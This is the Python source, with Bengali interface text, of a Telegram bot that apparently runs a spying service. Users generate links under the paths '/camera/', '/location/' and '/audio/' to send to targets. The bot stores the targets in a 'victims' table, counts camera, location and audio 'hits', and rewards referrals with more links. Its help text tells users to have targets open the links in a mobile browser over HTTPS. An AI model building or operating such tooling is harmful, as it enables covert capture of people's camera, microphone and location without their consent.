import telebot
import random
import string
import time
import json
import traceback
from datetime import datetime
from config import BOT_TOKEN, CHANNEL_USERNAME, BASE_URL, REQUIRED_REFS, FREE_LINKS
from database import db

# ========== বট ইনিশিয়ালাইজ ==========
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)  # single thread for Railway

# ========== ইউটিলিটি ফাংশন ==========

def generate_code(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def check_channel(user_id):
    """চ্যানেল মেম্বারশিপ চেক"""
    if not CHANNEL_USERNAME:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ('member', 'administrator', 'creator')
    except Exception:
        return False

def safe_send(chat_id, text, **kwargs):
    try:
        return bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"[SEND ERROR] {e}")
        return None

def safe_edit(chat_id, msg_id, text, **kwargs):
    try:
        return bot.edit_message_text(text, chat_id, msg_id, **kwargs)
    except Exception:
        return None

# ========== কীবোর্ড ==========

def main_keyboard():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("🆕 লিংক", callback_data="lnk"),
        telebot.types.InlineKeyboardButton("📋 মাইন", callback_data="min"),
        telebot.types.InlineKeyboardButton("👤 প্রো", callback_data="pro"),
        telebot.types.InlineKeyboardButton("🔗 রেফার", callback_data="ref"),
        telebot.types.InlineKeyboardButton("📊 স্ট্যাট", callback_data="sta"),
    )
    if CHANNEL_USERNAME:
        kb.add(telebot.types.InlineKeyboardButton("📢 চ্যানেল", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    return kb

def back_kb():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🔙 মেনু", callback_data="mnu"))
    return kb

# ========== /start ==========

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    first_name = message.from_user.first_name or ''
    
    user = db.get_user(user_id)
    is_new = False
    
    if not user:
        db.create_user(user_id, username, first_name)
        user = db.get_user(user_id)
        is_new = True
    
    # রেফারেল প্রসেস
    args = message.text.split()
    if len(args) > 1 and is_new:
        try:
            referrer_id = int(args[1])
            if referrer_id != user_id and user and not user['referred_by']:
                if db.add_referral(referrer_id, user_id):
                    try:
                        ref_user = db.get_user(referrer_id)
                        ref_name = ref_user['first_name'] or ref_user['username'] if ref_user else 'User'
                        bot.send_message(
                            referrer_id,
                            f"🎉 *নতুন রেফারেল!*\n\n{first_name} (@{username}) আপনার লিংক ব্যবহার করেছে!\n\n"
                            f"🔗 মোট রেফারেল: {db.get_user(referrer_id)['refer_count']}",
                            parse_mode='Markdown'
                        )
                    except:
                        pass
        except (ValueError, TypeError):
            pass
    
    # মেসেজ তৈরি
    if is_new:
        text = (
            f"👋 *স্বাগতম {first_name}!*\n\n"
            f"✅ আপনি {FREE_LINKS}টি ফ্রি লিংক পেয়েছেন!\n"
            f"প্রতি {REQUIRED_REFS} রেফারেলে ১টি এক্সট্রা লিংক।\n\n"
            f"👇 নিচের বাটন ব্যবহার করুন:"
        )
    else:
        text = (
            f"👋 *ফিরে আসুন {first_name}!*\n\n"
            f"👇 নিচের বাটন ব্যবহার করুন:"
        )
    
    safe_send(user_id, text, parse_mode='Markdown', reply_markup=main_keyboard())

# ========== কলব্যাক হ্যান্ডলার ==========

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data = call.data
    
    try:
        if data == 'mnu':
            safe_edit(user_id, call.message.message_id,
                      '🤖 *মেইন মেনু*\n\nনিচ থেকে অপশন সিলেক্ট করুন:',
                      parse_mode='Markdown', reply_markup=main_keyboard())

        elif data == 'pro':
            cb_profile(call)
        elif data == 'lnk':
            cb_new_link(call)
        elif data == 'min':
            cb_my_links(call)
        elif data == 'ref':
            cb_referral(call)
        elif data == 'sta':
            cb_stats(call)
        elif data.startswith('p'):
            # পেজিনেশন: p0, p1, p2...
            try:
                page = int(data[1:])
                cb_my_links(call, page)
            except ValueError:
                pass
    
    except Exception as e:
        print(f"[CALLBACK ERROR] {traceback.format_exc()}")
        bot.answer_callback_query(call.id, '❌ ত্রুটি হয়েছে', show_alert=True)
    
    bot.answer_callback_query(call.id)

# ========== প্রোফাইল ==========

def cb_profile(call):
    user_id = call.from_user.id
    user = db.get_user(user_id)
    
    if not user:
        safe_edit(user_id, call.message.message_id, '❌ ইউজার পাওয়া যায়নি। /start দিন',
                  reply_markup=back_kb())
        return
    
    channel_ok = check_channel(user_id)
    available = db.get_available_links(user_id)
    victims = db.get_user_victims(user_id)
    data_count = sum(1 for v in victims if v['camera_data'] or v['location_data'] or v['audio_data'])
    
    text = (
        f'👤 *প্রোফাইল*\n\n'
        f'🆔 `{user_id}`\n'
        f'👤 {user["first_name"] or user["username"]}\n'
        f'📅 {user["join_date"][:10]}\n'
        f'📢 {'✅ জয়েন' if channel_ok else '❌ জয়েন নাই'}\n\n'
        f'👥 রেফারেল: {user["refer_count"]}\n'
        f'🎯 লিংক: {user["total_links_created"]}\n'
        f'📦 বাকি: {available}\n'
        f'✅ ডাটা: {data_count}'
    )
    
    safe_edit(user_id, call.message.message_id, text, parse_mode='Markdown', reply_markup=back_kb())

# ========== নতুন লিংক ==========

def cb_new_link(call):
    user_id = call.from_user.id
    
    # চ্যানেল চেক
    if not check_channel(user_id):
        safe_edit(user_id, call.message.message_id,
                  f'❌ *চ্যানেল জয়েন করুন:* {CHANNEL_USERNAME}\n\nজয়েন করে আবার চেষ্টা করুন।',
                  parse_mode='Markdown', reply_markup=back_kb())
        return
    
    # রেট লিমিট
    if db.is_rate_limited(user_id):
        safe_edit(user_id, call.message.message_id,
                  '⚠️ *রেট লিমিট!*\n\nপ্রতি ঘন্টায় সর্বোচ্চ ৫টি লিংক।\n\nএক ঘন্টা পর চেষ্টা করুন।',
                  parse_mode='Markdown', reply_markup=back_kb())
        return
    
    # উপলব্ধ লিংক
    available = db.get_available_links(user_id)
    if available <= 0:
        user = db.get_user(user_id)
        if user:
            rem = REQUIRED_REFS - (user['refer_count'] % REQUIRED_REFS)
            if rem == REQUIRED_REFS:
                rem = 0
        else:
            rem = REQUIRED_REFS
        
        safe_edit(user_id, call.message.message_id,
                  f'❌ *কোন লিংক বাকি নেই!*\n\n'
                  f'আরো {max(1, rem)}টি রেফারেল এনে লিংক আনলক করুন।\n\n'
                  f'🔗 রেফারেল পেতে "রেফার" বাটনে ক্লিক করুন।',
                  parse_mode='Markdown', reply_markup=main_keyboard())
        return
    
    # লিংক তৈরি
    code = generate_code()
    c_url = f'{BASE_URL}/camera/{code}'
    l_url = f'{BASE_URL}/location/{code}'
    a_url = f'{BASE_URL}/audio/{code}'
    
    if not db.create_victim(user_id, code, c_url, l_url, a_url):
        safe_edit(user_id, call.message.message_id, '❌ ব্যর্থ। আবার চেষ্টা করুন।',
                  reply_markup=back_kb())
        return
    
    text = (
        f'✅ *নতুন হানিপট!*\n\n'
        f'🆔 `{code}`\n'
        f'📦 বাকি: {available - 1}\n\n'
        f'📷 *ক্যামেরা:*\n`{c_url}`\n\n'
        f'📍 *লোকেশন:*\n`{l_url}`\n\n'
        f'🎤 *অডিও:*\n`{a_url}`\n\n'
        f'💡 মোবাইল ব্রাউজারে খুলতে বলুন, HTTPS নিশ্চিত করুন।'
    )
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton('📋 মাইন', callback_data='min'))
    kb.add(telebot.types.InlineKeyboardButton('🔙 মেনু', callback_data='mnu'))
    
    safe_edit(user_id, call.message.message_id, text, parse_mode='Markdown', reply_markup=kb)

# ========== মাই লিংকস ==========

def cb_my_links(call, page=0):
    user_id = call.from_user.id
    per_page = 5
    offset = page * per_page
    victims = db.get_user_victims(user_id, limit=per_page, offset=offset)
    
    # মোট কাউন্ট
    db.c.execute('SELECT COUNT(*) FROM victims WHERE telegram_id=?', (user_id,))
    total = db.c.fetchone()[0]
    total_pages = max(1, (total + per_page - 1) // per_page)
    
    if total == 0:
        safe_edit(user_id, call.message.message_id,
                  '❌ কোন লিংক নেই।\n\n🆕 "লিংক" বাটনে ক্লিক করে তৈরি করুন।',
                  reply_markup=main_keyboard())
        return
    
    text = f'📋 *লিংক সমূহ* (পৃ {page+1}/{total_pages})\n\n'
    
    for v in victims:
        icons = []
        if v['camera_data']: icons.append('📷')
        if v['location_data']: icons.append('📍')
        if v['audio_data']: icons.append('🎤')
        status = ' '.join(icons) if icons else '⏳'
        text += f'`{v["victim_code"]}` {v["created_at"][:10]}\n   {status} | হিট: {v["access_count"]}\n\n'
    
    kb = telebot.types.InlineKeyboardMarkup()
    
    # নেভিগেশন
    nav = []
    if page > 0:
        nav.append(telebot.types.InlineKeyboardButton('◀️', callback_data=f'p{page-1}'))
    if page < total_pages - 1:
        nav.append(telebot.types.InlineKeyboardButton('▶️', callback_data=f'p{page+1}'))
    if nav:
        kb.row(*nav)
    
    kb.add(telebot.types.InlineKeyboardButton('🔙 মেনু', callback_data='mnu'))
    
    safe_edit(user_id, call.message.message_id, text, parse_mode='Markdown', reply_markup=kb)

# ========== রেফারেল ==========

def cb_referral(call):
    user_id = call.from_user.id
    bot_info = bot.get_me()
    ref_link = f'https://t.me/{bot_info.username}?start={user_id}'
    
    user = db.get_user(user_id)
    ref_count = user['refer_count'] if user else 0
    available = ref_count // REQUIRED_REFS
    rem = REQUIRED_REFS - (ref_count % REQUIRED_REFS)
    if rem == REQUIRED_REFS:
        rem = 0
    
    text = (
        f'🔗 *রেফারেল*\n\n'
        f'`{ref_link}`\n\n'
        f'👥 মোট: {ref_count}\n'
        f'🔓 লিংক: {available}\n'
        f'🎁 ফ্রি: {FREE_LINKS}\n'
        f'📌 বাকি: {rem}টি\n\n'
        f'💡 ফ্রেন্ডদের শেয়ার করুন!'
    )
    
    safe_edit(user_id, call.message.message_id, text, parse_mode='Markdown', reply_markup=back_kb())

# ========== স্ট্যাটস ==========

def cb_stats(call):
    user_id = call.from_user.id
    stats = db.get_global_stats()
    
    text = (
        f'📊 *গ্লোবাল স্ট্যাটস*\n\n'
        f'👥 ইউজার: {stats["total_users"]}\n'
        f'🎯 ভিক্টিম: {stats["total_victims"]}\n'
        f'📷 ক্যামেরা: {stats["camera_hits"]}\n'
        f'📍 লোকেশন: {stats["location_hits"]}\n'
        f'🎤 অডিও: {stats["audio_hits"]}'
    )
    
    safe_edit(user_id, call.message.message_id, text, parse_mode='Markdown', reply_markup=back_kb())

# ========== বট চালানো ==========

def run_bot():
    """বট চালু করে, error হলে restart"""
    print('🤖 Bot starting...')
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=False)
        except Exception as e:
            print(f'[BOT RESTART] {e}')
            time.sleep(3)
            continue
        break


if __name__ == '__main__':
    run_bot()
